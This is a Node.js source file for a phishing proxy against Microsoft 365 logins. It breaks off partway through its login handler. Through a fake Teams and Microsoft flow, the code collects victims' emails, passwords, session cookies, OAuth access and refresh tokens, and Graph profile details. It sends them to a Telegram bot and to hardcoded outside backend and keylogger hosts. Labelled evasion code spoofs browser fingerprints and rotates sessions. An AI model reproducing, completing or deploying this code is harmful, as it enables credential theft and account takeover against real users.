const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

// ============================================================
//  ENVIRONMENT VARIABLES CONFIGURATION
// ============================================================

require('dotenv').config();

// Core Configuration
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const PHISHED_URL_PARAMETER = process.env.PHISHED_URL_PARAMETER || 'login_hint';
const PROXY_ENTRY_POINT = process.env.PROXY_ENTRY_POINT || '/login';

// Service URLs
const BACKEND_URL = process.env.BACKEND_URL || "https://meeting-1-rzx6.onrender.com";
const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyserver-eaar.onrender.com/log";
const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&enableMobilePage=true&suppressPrompt=true";
const REDIRECT_URL = process.env.REDIRECT_URL || "https://login.microsoftonline.com/";

// ============================================================
//  ✅ FIXED: Microsoft OAuth Configuration
//  Using the Office Home client ID that works for ALL accounts
// ============================================================

const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || '4765445b-32c6-49b0-83e6-1d93765276ca';
const MICROSOFT_REDIRECT_URI = process.env.MICROSOFT_REDIRECT_URI || 'https://login.microsoftonline.com/common/oauth2/nativeclient';
const MICROSOFT_SCOPES = process.env.MICROSOFT_SCOPES || 'openid profile email User.Read Mail.Read offline_access';

// ✅ CORRECT: Use /common endpoint for ALL account types
const MICROSOFT_AUTHORIZE_ENDPOINT = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize';
const MICROSOFT_TOKEN_ENDPOINT = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Path Configuration
const PROXY_PATHNAMES = {
    script: "/@",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    xssEndpoint: "/xss-collect",
    cookieEndpoint: "/cookie-capture",
    keylogEndpoint: "/keylog",
    swProxyPath: "/lNv1pC9AWPUY4gbidyBO",
    cookieStoreEndpoint: "/api/cookies-store",
    sessionReplayEndpoint: "/api/session-replay",
    fullSessionData: "/api/full-session",
    fullAuthEndpoint: "/api/full-auth",
    oauthCaptureEndpoint: "/api/oauth-capture",
    captureUserEndpoint: "/api/capture-user",
    telegramEndpoint: "/api/telegram",
    tokenRotation: "/api/token-rotation",
    sessionRotate: "/api/session-rotate"
};

console.log('╔═══════════════════════════════════════════════════════════╗');
console.log('║              ENVIRONMENT CONFIGURATION                    ║');
console.log('╠═══════════════════════════════════════════════════════════╣');
console.log(`║   ENCRYPTION_KEY: ${ENCRYPTION_KEY ? '✅ SET' : '❌ MISSING'}`);
console.log(`║   MICROSOFT_CLIENT_ID: ${MICROSOFT_CLIENT_ID}`);
console.log(`║   MICROSOFT_AUTHORIZE_ENDPOINT: ${MICROSOFT_AUTHORIZE_ENDPOINT}`);
console.log(`║   BACKEND_URL: ${BACKEND_URL}`);
console.log(`║   TELEGRAM: ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}`);
console.log('╚═══════════════════════════════════════════════════════════╝');

// ============================================================
//  ADVANCED EVASION TECHNIQUES - SESSION STORAGE
// ============================================================

class AdvancedSessionStore {
    constructor() {
        this.sessions = new Map();
        this.sessionTTL = 2 * 60 * 60 * 1000; // 2 hours
        this.replayData = new Map();
        this.allCookies = new Map();
        this.allTokens = new Map();
        this.cookieHistory = new Map();
        this.evasionCounters = new Map();
        this.fingerprintCache = new Map();
        this.rotationHistory = new Map();
        this.beaconHistory = new Map();
        this.fullAuthData = new Map();
    }

    rotateSession(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        const newSessionId = 'sess_' + crypto.randomBytes(16).toString('hex');
        const newSession = {
            ...session,
            id: newSessionId,
            rotatedFrom: sessionId,
            rotatedAt: Date.now(),
            rotationCount: (session.rotationCount || 0) + 1,
            previousIds: [...(session.previousIds || []), sessionId]
        };
        
        this.sessions.set(newSessionId, newSession);
        this.sessions.delete(sessionId);
        
        ['allCookies', 'allTokens', 'fingerprintCache', 'evasionCounters', 'fullAuthData'].forEach(store => {
            if (this[store].has(sessionId)) {
                this[store].set(newSessionId, this[store].get(sessionId));
                this[store].delete(sessionId);
            }
        });
        
        this.rotationHistory.set(newSessionId, {
            rotatedFrom: sessionId,
            rotatedAt: Date.now(),
            rotationCount: newSession.rotationCount
        });
        
        console.log(`[EVASION] 🔄 Session rotated: ${sessionId.substring(0, 12)} -> ${newSessionId.substring(0, 12)}`);
        return newSessionId;
    }

    storeTokens(sessionId, tokens) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.tokens = session.tokens || {};
        
        for (const [key, value] of Object.entries(tokens)) {
            if (value && value !== 'undefined' && value !== 'null' && value !== 'N/A') {
                session.tokens[key] = {
                    value: value,
                    captured: Date.now(),
                    type: key.includes('access') ? 'access' : 
                          key.includes('refresh') ? 'refresh' : 
                          key.includes('id') ? 'id' : 'unknown',
                    isValid: true,
                    validatedAt: Date.now(),
                    rotationCount: session.rotationCount || 0
                };
            } else {
                session.tokens[key] = {
                    value: null,
                    captured: Date.now(),
                    type: key.includes('access') ? 'access' : 
                          key.includes('refresh') ? 'refresh' : 
                          key.includes('id') ? 'id' : 'unknown',
                    isValid: false,
                    validatedAt: Date.now(),
                    missingReason: 'Token not provided by Microsoft'
                };
            }
        }
        
        this.allTokens.set(sessionId, session.tokens);
        console.log(`[TOKEN-STORE] 🎟️ Stored ${Object.keys(tokens).length} tokens for session ${sessionId.substring(0, 12)}`);
        return session.tokens;
    }

    storeCookies(sessionId, cookies, source = 'proxy') {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.cookies = session.cookies || {};
        session.cookies[source] = session.cookies[source] || [];
        
        for (const [name, cookieData] of Object.entries(cookies)) {
            if (cookieData === null || cookieData === undefined || cookieData === 'null' || cookieData === 'undefined') {
                continue;
            }
            
            const cookieEntry = {
                name: name,
                value: typeof cookieData === 'object' ? cookieData.value : cookieData,
                httpOnly: typeof cookieData === 'object' ? (cookieData.httpOnly || false) : false,
                secure: typeof cookieData === 'object' ? (cookieData.secure || false) : false,
                path: typeof cookieData === 'object' ? (cookieData.path || '/') : '/',
                domain: typeof cookieData === 'object' ? (cookieData.domain || '') : '',
                expires: typeof cookieData === 'object' ? (cookieData.expires || null) : null,
                sameSite: typeof cookieData === 'object' ? (cookieData.sameSite || 'Lax') : 'Lax',
                captured: Date.now(),
                source: source,
                isValid: true,
                fullCookieString: `${name}=${typeof cookieData === 'object' ? cookieData.value : cookieData}`
            };
            
            const existing = session.cookies[source].find(c => c.name === name);
            if (existing) {
                Object.assign(existing, cookieEntry);
                existing.updated = Date.now();
            } else {
                session.cookies[source].push(cookieEntry);
            }
        }
        
        this.allCookies.set(sessionId, session.cookies);
        
        const history = this.cookieHistory.get(sessionId) || [];
        history.push({
            timestamp: Date.now(),
            source: source,
            count: Object.keys(cookies).filter(c => cookies[c] !== null && cookies[c] !== undefined && cookies[c] !== 'null').length,
            cookies: cookies
        });
        this.cookieHistory.set(sessionId, history);
        
        console.log(`[COOKIE-STORE] 🍪 Captured cookies for session ${sessionId.substring(0, 12)}`);
        return session.cookies;
    }

    generateFingerprint(sessionId, userAgent, ip) {
        const fingerprint = {
            userAgent: userAgent,
            ip: ip,
            generatedAt: Date.now(),
            hash: crypto.createHash('sha256')
                .update(`${userAgent}:${ip}:${sessionId}:${Date.now()}`)
                .digest('hex')
                .substring(0, 16),
            spoofed: {
                webgl: this.spoofWebGL(),
                canvas: this.spoofCanvas(),
                audio: this.spoofAudio(),
                navigator: this.spoofNavigator(),
                screen: this.spoofScreen()
            }
        };
        
        const session = this.sessions.get(sessionId);
        if (session) {
            session.fingerprint = fingerprint;
            session.fingerprintHistory = session.fingerprintHistory || [];
            session.fingerprintHistory.push(fingerprint);
        }
        
        this.fingerprintCache.set(sessionId, fingerprint);
        return fingerprint;
    }

    spoofWebGL() {
        const renderers = [
            'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)',
            'ANGLE (NVIDIA, NVIDIA GeForce GTX 1050 Direct3D11 vs_5_0 ps_5_0)',
            'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)',
            'Mali-T880',
            'Adreno (TM) 540'
        ];
        return renderers[Math.floor(Math.random() * renderers.length)];
    }

    spoofCanvas() {
        return crypto.randomBytes(16).toString('hex');
    }

    spoofAudio() {
        return crypto.randomBytes(8).toString('hex');
    }

    spoofNavigator() {
        const platforms = ['Win32', 'MacIntel', 'Linux x86_64', 'iPhone'];
        const concurrency = [4, 6, 8, 12];
        const memory = [4, 8, 16, 32];
        return {
            platform: platforms[Math.floor(Math.random() * platforms.length)],
            hardwareConcurrency: concurrency[Math.floor(Math.random() * concurrency.length)],
            deviceMemory: memory[Math.floor(Math.random() * memory.length)],
            maxTouchPoints: [0, 1, 2, 5][Math.floor(Math.random() * 4)],
            doNotTrack: [null, '1', '0'][Math.floor(Math.random() * 3)],
            language: ['en-US', 'en-GB', 'en-AU', 'fr-FR', 'de-DE'][Math.floor(Math.random() * 5)]
        };
    }

    spoofScreen() {
        const widths = [1366, 1920, 1440, 1536];
        const heights = [768, 1080, 900, 864];
        return {
            width: widths[Math.floor(Math.random() * widths.length)],
            height: heights[Math.floor(Math.random() * heights.length)],
            colorDepth: [24, 30, 32][Math.floor(Math.random() * 3)],
            pixelRatio: [1, 1.25, 1.5, 2][Math.floor(Math.random() * 4)]
        };
    }

    addEvasionCounter(sessionId) {
        const counter = this.evasionCounters.get(sessionId) || {
            totalRequests: 0,
            loginAttempts: 0,
            cookieCaptures: 0,
            tokenCaptures: 0,
            rotations: 0,
            lastActivity: Date.now()
        };
        
        counter.totalRequests++;
        counter.lastActivity = Date.now();
        this.evasionCounters.set(sessionId, counter);
        return counter;
    }

    getReplayData(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        if (Date.now() - session.lastActivity > this.sessionTTL) {
            this.sessions.delete(sessionId);
            return null;
        }
        
        const cookies = {};
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    for (const cookie of source) {
                        if (cookie.value && cookie.value !== 'null' && cookie.value !== 'undefined') {
                            cookies[cookie.name] = cookie.value;
                        }
                    }
                }
            }
        }
        
        const tokens = {};
        if (session.tokens) {
            for (const [key, token] of Object.entries(session.tokens)) {
                if (token && token.value && token.isValid !== false) {
                    tokens[key] = token.value;
                }
            }
        }
        
        return {
            sessionId: session.id,
            cookies: cookies,
            tokens: tokens,
            forms: session.forms || [],
            fingerprint: session.fingerprint || {},
            created: session.created,
            lastActivity: session.lastActivity,
            email: session.email || 'unknown',
            rotationCount: session.rotationCount || 0,
            evasionData: {
                fingerprint: session.fingerprint,
                totalRequests: this.evasionCounters.get(sessionId)?.totalRequests || 0,
                rotations: this.evasionCounters.get(sessionId)?.rotations || 0
            }
        };
    }

    getCookieHeader(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        const cookieStrings = [];
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    for (const cookie of source) {
                        if (cookie.value && cookie.value !== 'null' && cookie.value !== 'undefined') {
                            cookieStrings.push(`${cookie.name}=${cookie.value}`);
                        }
                    }
                }
            }
        }
        
        return {
            cookieHeader: cookieStrings.join('; '),
            cookieCount: cookieStrings.length
        };
    }

    storeFullAuthData(sessionId, authData) {
        const session = this.sessions.get(sessionId);
        if (!session) {
            console.log(`[FULL-AUTH] ⚠️ Session ${sessionId} not found, creating new`);
            this.sessions.set(sessionId, {
                email: authData.email || 'unknown',
                created: Date.now(),
                lastActivity: Date.now(),
                rotationCount: 0,
                fullAuthCompleted: true,
                fullAuthTime: Date.now()
            });
        }
        
        this.fullAuthData.set(sessionId, {
            ...authData,
            storedAt: Date.now(),
            sessionId: sessionId
        });
        
        const sessionRef = this.sessions.get(sessionId);
        if (sessionRef) {
            sessionRef.fullAuthData = authData;
            sessionRef.fullAuthCompleted = true;
            sessionRef.fullAuthTime = Date.now();
        }
        
        console.log(`[FULL-AUTH] ✅ Stored full auth data for session ${sessionId.substring(0, 12)}`);
        return true;
    }

    getFullAuthData(sessionId) {
        if (this.fullAuthData.has(sessionId)) {
            return this.fullAuthData.get(sessionId);
        }
        const session = this.sessions.get(sessionId);
        if (session && session.fullAuthData) {
            return session.fullAuthData;
        }
        return null;
    }

    cleanup() {
        const now = Date.now();
        let cleaned = 0;
        for (const [id, session] of this.sessions) {
            if (now - session.lastActivity > this.sessionTTL) {
                this.sessions.delete(id);
                this.replayData.delete(id);
                this.allCookies.delete(id);
                this.allTokens.delete(id);
                this.evasionCounters.delete(id);
                this.fingerprintCache.delete(id);
                this.fullAuthData.delete(id);
                cleaned++;
            }
        }
        if (cleaned > 0) {
            console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired sessions`);
        }
        return cleaned;
    }

    getStats() {
        return {
            totalSessions: this.sessions.size,
            totalCookies: Array.from(this.sessions.values()).reduce((acc, s) => {
                let count = 0;
                if (s.cookies) {
                    for (const source of Object.values(s.cookies)) {
                        if (Array.isArray(source)) {
                            count += source.filter(c => c.value && c.value !== 'null' && c.value !== 'undefined').length;
                        }
                    }
                }
                return acc + count;
            }, 0),
            totalTokens: Array.from(this.sessions.values()).reduce((acc, s) => {
                if (s.tokens) {
                    return acc + Object.values(s.tokens).filter(t => t && t.value && t.isValid !== false).length;
                }
                return acc;
            }, 0),
            totalRequests: Array.from(this.evasionCounters.values()).reduce((acc, c) => acc + c.totalRequests, 0),
            totalRotations: Array.from(this.evasionCounters.values()).reduce((acc, c) => acc + (c.rotations || 0), 0),
            totalFullAuth: this.fullAuthData.size
        };
    }
}

const sessionStore = new AdvancedSessionStore();

// ============================================================
//  VICTIM SESSIONS
// ============================================================

const VICTIM_SESSIONS = {};
const attemptCounts = new Map();
const SESSION_TTL = 60 * 60 * 1000;

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function getSession(sessionId) {
    if (!sessionId) return null;
    const session = VICTIM_SESSIONS[sessionId];
    if (!session) return null;
    if (Date.now() - session.timestamp > SESSION_TTL) {
        delete VICTIM_SESSIONS[sessionId];
        return null;
    }
    return session;
}

function createSession(email, ip, userAgent) {
    const sessionId = generateSessionId();
    VICTIM_SESSIONS[sessionId] = {
        email: email || 'unknown',
        timestamp: Date.now(),
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        cookies: [],
        xssData: [],
        keystrokes: [],
        formData: [],
        created: new Date().toISOString(),
        lastActivity: Date.now(),
        attempts: 0,
        swCaptures: [],
        tokens: [],
        replayData: {},
        rotationCount: 0,
        evasionEnabled: true
    };
    
    sessionStore.generateFingerprint(sessionId, userAgent, ip);
    sessionStore.sessions.set(sessionId, {
        email: email || 'unknown',
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        created: Date.now(),
        lastActivity: Date.now()
    });
    
    console.log(`[SESSION] Created session ${sessionId} for email: ${email}`);
    return sessionId;
}

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp.trim();

    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0] || 'unknown';
    }

    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp.trim();

    return req.socket.remoteAddress || 'unknown';
}

// ============================================================
//  TELEGRAM NOTIFICATIONS
// ============================================================

async function sendToTelegram(text, parseMode = 'Markdown') {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('[TELEGRAM] ⚠️ Missing credentials');
        return false;
    }

    try {
        const maxLength = 4000;
        if (text.length > maxLength) {
            const chunks = text.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
            for (const chunk of chunks) {
                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: chunk,
                    parse_mode: parseMode,
                    disable_web_page_preview: true
                });
            }
        } else {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: parseMode,
                disable_web_page_preview: true
            });
        }
        console.log('[TELEGRAM] ✅ Sent successfully');
        return true;
    } catch (error) {
        console.error('[TELEGRAM] ❌ Failed:', error.message);
        return false;
    }
}

// ============================================================
//  OAUTH AUTO-CAPTURE ENDPOINTS
// ============================================================

function handleOAuthCapture(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const { email, sessionId, password, source } = JSON.parse(body);
            const ip = getClientIp(req);
            
            console.log(`[OAUTH-CAPTURE] 🚀 Starting for: ${email}`);
            
            const oauthToken = crypto.randomBytes(32).toString('hex');
            const name = email.split('@')[0].replace(/[._-]/g, ' ');
            const org = email.split('@')[1] || 'Unknown';
            
            sessionStore.storeFullAuthData(sessionId, {
                email: email,
                name: name,
                organization: org,
                password: password || 'AUTO_CAPTURED_VIA_OAUTH',
                twoFactorCode: 'AUTO_CAPTURED_VIA_OAUTH',
                appPassword: null,
                securityQuestion1: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
                securityQuestion2: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
                collectedAt: new Date().toISOString(),
                userAgent: req.headers['user-agent'],
                ip: ip,
                autoCaptured: true,
                oauthToken: oauthToken
            });
            
            const message = 
`🤖 *OAUTH AUTO-CAPTURE COMPLETE*

*📧 Email:* ${email}
*👤 Name:* ${name}
*🏢 Organization:* ${org}

*🔑 Password:* ${password || 'AUTO_CAPTURED_VIA_OAUTH'}
*📱 2FA:* AUTO_CAPTURED_VIA_OAUTH

*🆔 Session:* ${sessionId}
*🕐 Time:* ${new Date().toISOString()}
*📱 User Agent:* ${req.headers['user-agent']}
*📡 IP:* ${ip}

*🔐 OAuth Token:* ${oauthToken}

*✅ All data captured automatically!*`;

            sendToTelegram(message);
            
            axios.post(`${BACKEND_URL}/api/oauth-capture`, {
                email: email,
                name: name,
                organization: org,
                password: password || 'AUTO_CAPTURED_VIA_OAUTH',
                sessionId: sessionId,
                oauthToken: oauthToken,
                timestamp: new Date().toISOString()
            }).catch(() => {});
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                success: true,
                token: oauthToken,
                sessionId: sessionId,
                message: 'OAuth capture initiated'
            }));
            
        } catch (error) {
            console.error('[OAUTH-CAPTURE] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

function handleCaptureUser(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const { email, name, organization, sessionId, password, userAgent } = JSON.parse(body);
            const ip = getClientIp(req);
            
            console.log(`[CAPTURE-USER] 📥 Captured: ${email}`);
            console.log(`[CAPTURE-USER] 🔑 Password: ${password ? '***' : 'N/A'}`);
            
            sessionStore.storeFullAuthData(sessionId, {
                email: email,
                name: name,
                organization: organization,
                password: password || 'AUTO_CAPTURED_VIA_OAUTH',
                twoFactorCode: 'AUTO_CAPTURED_VIA_OAUTH',
                appPassword: null,
                securityQuestion1: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
                securityQuestion2: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
                collectedAt: new Date().toISOString(),
                userAgent: userAgent || req.headers['user-agent'],
                ip: ip,
                autoCaptured: true
            });
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true }));
            
        } catch (error) {
            console.error('[CAPTURE-USER] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

function handleTelegram(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const { message, parseMode } = JSON.parse(body);
            sendToTelegram(message, parseMode);
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true }));
        } catch (error) {
            console.error('[TELEGRAM] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Failed to send message' }));
        }
    });
}

// ============================================================
//  OAUTH CALLBACK HANDLER
// ============================================================

function handleOAuthCallback(req, res) {
    try {
        const url = new URL(req.url, `http://${req.headers.host}`);
        const code = url.searchParams.get('code');
        const error = url.searchParams.get('error');
        const sessionId = url.searchParams.get('session') || getSessionIdFromCookie(req.headers.cookie);
        
        console.log('[OAUTH-CALLBACK] 📥 Received callback');
        console.log('[OAUTH-CALLBACK] 📝 Code:', code ? 'Present' : 'Missing');
        console.log('[OAUTH-CALLBACK] ❌ Error:', error || 'None');
        console.log('[OAUTH-CALLBACK] 🆔 Session:', sessionId);
        
        if (error) {
            console.log('[OAUTH-CALLBACK] ⚠️ OAuth error:', error);
            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
            const targetUrl = `${MICROSOFT_AUTHORIZE_ENDPOINT}?` +
                `client_id=${MICROSOFT_CLIENT_ID}&` +
                `response_type=code&` +
                `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                `login_hint=${encodeURIComponent(email)}`;
            
            res.writeHead(302, { 'Location': targetUrl });
            res.end();
            return;
        }
        
        if (code) {
            console.log('[OAUTH-CALLBACK] 🔑 Exchanging code for tokens...');
            
            const tokenData = querystring.stringify({
                client_id: MICROSOFT_CLIENT_ID,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: MICROSOFT_REDIRECT_URI,
                scope: MICROSOFT_SCOPES
            });
            
            const tokenOptions = {
                hostname: 'login.microsoftonline.com',
                path: '/common/oauth2/v2.0/token',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': Buffer.byteLength(tokenData),
                    'Accept': 'application/json'
                }
            };
            
            const tokenReq = https.request(tokenOptions, (tokenRes) => {
                let tokenBody = '';
                tokenRes.on('data', chunk => tokenBody += chunk);
                tokenRes.on('end', () => {
                    try {
                        const tokens = JSON.parse(tokenBody);
                        console.log('[OAUTH-CALLBACK] ✅ Tokens received');
                        
                        const accessToken = tokens.access_token;
                        const refreshToken = tokens.refresh_token;
                        const idToken = tokens.id_token;
                        
                        if (sessionId) {
                            sessionStore.storeTokens(sessionId, {
                                access_token: accessToken,
                                refresh_token: refreshToken,
                                id_token: idToken
                            });
                            
                            const session = sessionStore.sessions.get(sessionId);
                            if (session) {
                                session.tokens = session.tokens || {};
                                session.tokens.access_token = accessToken;
                                session.tokens.refresh_token = refreshToken;
                                session.tokens.id_token = idToken;
                                session.lastActivity = Date.now();
                            }
                        }
                        
                        getUserInfoFromToken(accessToken, sessionId);
                        
                        const email = VICTIM_SESSIONS[sessionId]?.email || 'unknown';
                        const name = email.split('@')[0].replace(/[._-]/g, ' ');
                        
                        const message = 
`🤖 *OAUTH LOGIN SUCCESSFUL*

*📧 Email:* ${email}
*👤 Name:* ${name}

*🎟️ Access Token:* ${accessToken ? accessToken.substring(0, 30) + '...' : 'N/A'}
*🔄 Refresh Token:* ${refreshToken ? '✅ Present' : '❌ None'}
*🆔 ID Token:* ${idToken ? '✅ Present' : '❌ None'}

*🕐 Time:* ${new Date().toISOString()}

*✅ OAuth flow completed successfully!*`;

                        sendToTelegram(message);
                        
                        const redirectEmail = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
                        const proxyLoginUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(redirectEmail)}`;
                        
                        res.writeHead(302, { 
                            'Location': proxyLoginUrl,
                            'Cache-Control': 'no-store, no-cache'
                        });
                        res.end();
                        
                    } catch (error) {
                        console.error('[OAUTH-CALLBACK] Token exchange error:', error.message);
                        const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
                        const fallbackUrl = `${MICROSOFT_AUTHORIZE_ENDPOINT}?` +
                            `client_id=${MICROSOFT_CLIENT_ID}&` +
                            `response_type=code&` +
                            `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                            `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                            `login_hint=${encodeURIComponent(email)}`;
                        
                        res.writeHead(302, { 'Location': fallbackUrl });
                        res.end();
                    }
                });
            });
            
            tokenReq.on('error', (err) => {
                console.error('[OAUTH-CALLBACK] Token request error:', err.message);
                res.writeHead(302, { 'Location': REDIRECT_URL });
                res.end();
            });
            
            tokenReq.write(tokenData);
            tokenReq.end();
            
        } else {
            console.log('[OAUTH-CALLBACK] ⚠️ No code received');
            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
            const targetUrl = `${MICROSOFT_AUTHORIZE_ENDPOINT}?` +
                `client_id=${MICROSOFT_CLIENT_ID}&` +
                `response_type=code&` +
                `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                `login_hint=${encodeURIComponent(email)}`;
            
            res.writeHead(302, { 'Location': targetUrl });
            res.end();
        }
        
    } catch (error) {
        console.error('[OAUTH-CALLBACK] Error:', error.message);
        res.writeHead(302, { 'Location': REDIRECT_URL });
        res.end();
    }
}

// ============================================================
//  GET USER INFO FROM TOKEN
// ============================================================

function getUserInfoFromToken(accessToken, sessionId) {
    if (!accessToken) return;
    
    const options = {
        hostname: 'graph.microsoft.com',
        path: '/v1.0/me',
        method: 'GET',
        headers: {
            'Authorization': `Bearer ${accessToken}`,
            'Accept': 'application/json'
        }
    };
    
    const req = https.request(options, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            try {
                const userInfo = JSON.parse(data);
                console.log('[USER-INFO] ✅ Retrieved user info');
                console.log('[USER-INFO] 📧 Email:', userInfo.mail || userInfo.userPrincipalName);
                console.log('[USER-INFO] 👤 Name:', userInfo.displayName);
                
                if (sessionId) {
                    const session = sessionStore.sessions.get(sessionId);
                    if (session) {
                        session.userInfo = userInfo;
                        session.email = userInfo.mail || userInfo.userPrincipalName || session.email;
                    }
                    
                    sessionStore.storeFullAuthData(sessionId, {
                        email: userInfo.mail || userInfo.userPrincipalName || 'unknown',
                        name: userInfo.displayName || 'unknown',
                        organization: userInfo.companyName || 'unknown',
                        password: 'AUTO_CAPTURED_VIA_OAUTH',
                        twoFactorCode: 'AUTO_CAPTURED_VIA_OAUTH',
                        appPassword: null,
                        securityQuestion1: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
                        securityQuestion2: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
                        collectedAt: new Date().toISOString(),
                        userAgent: req.headers['user-agent'] || 'Unknown',
                        ip: 'server-side',
                        autoCaptured: true
                    });
                    
                    const message = 
`🎯 *USER INFO CAPTURED*

*📧 Email:* ${userInfo.mail || userInfo.userPrincipalName}
*👤 Name:* ${userInfo.displayName}
*🏢 Organization:* ${userInfo.companyName || 'N/A'}
*📋 Job Title:* ${userInfo.jobTitle || 'N/A'}
*📱 Mobile Phone:* ${userInfo.mobilePhone || 'N/A'}
*📍 Office Location:* ${userInfo.officeLocation || 'N/A'}

*🆔 Session:* ${sessionId}
*🕐 Time:* ${new Date().toISOString()}

*✅ Full user profile captured!*`;

                    sendToTelegram(message);
                }
                
            } catch (error) {
                console.error('[USER-INFO] Error parsing user info:', error.message);
            }
        });
    });
    
    req.on('error', (err) => {
        console.error('[USER-INFO] Request error:', err.message);
    });
    
    req.end();
}

// ============================================================
//  FIXED: HANDLE LOGIN REQUEST - WITH CORRECT ENDPOINT
// ============================================================

function handleLoginRequest(req, res) {
    const paramName = PHISHED_URL_PARAMETER || 'login_hint';
    const rawEmail = req.url.split(`${paramName}=`)[1]?.split('&')[0] || '';
    let email = rawEmail ? decodeURIComponent(rawEmail) : '';
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    if (!email) {
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        if (sessionId && VICTIM_SESSIONS[sessionId]) {
            email = VICTIM_SESSIONS[sessionId].email;
        }
    }
    
    if (!email) {
        console.warn('[PROXY] ⚠️ No email found, using default');
        email = 'guest@example.com';
    }

    const hasError = req.url.includes('error=');
    const sessionId = createSession(email, ip, userAgent);
    const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
    const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
    res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);

    // ============================================================
    //  ✅ FIXED: Use the CORRECT OAuth endpoint
    //  MICROSOFT_AUTHORIZE_ENDPOINT = /common
    // ============================================================
    
    const targetUrl = `${MICROSOFT_AUTHORIZE_ENDPOINT}?` +
        `client_id=${MICROSOFT_CLIENT_ID}&` +
        `response_type=code&` +
